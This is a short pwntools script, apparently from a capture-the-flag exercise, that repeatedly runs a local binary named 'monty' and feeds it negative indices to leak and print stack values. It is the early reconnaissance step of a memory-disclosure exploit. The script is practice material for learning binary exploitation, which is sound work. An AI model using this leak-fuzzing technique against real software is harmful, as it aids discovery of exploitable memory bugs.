#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './monty'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'
host, port = '', 1337


# =========================================================
#                           FUZZ
# =========================================================

flag = ''

for i in range(-100, 0): # Range is obtained by fuzzing locally
    io = process(exe)
    io.sendlineafter(b'? ', f'{i}'.encode())
    io.recvuntil(b': ')
    stack_val = int(io.recvline().strip(), 10)
    print(f'Stack at {i}: {hex(stack_val)}')
    io.close()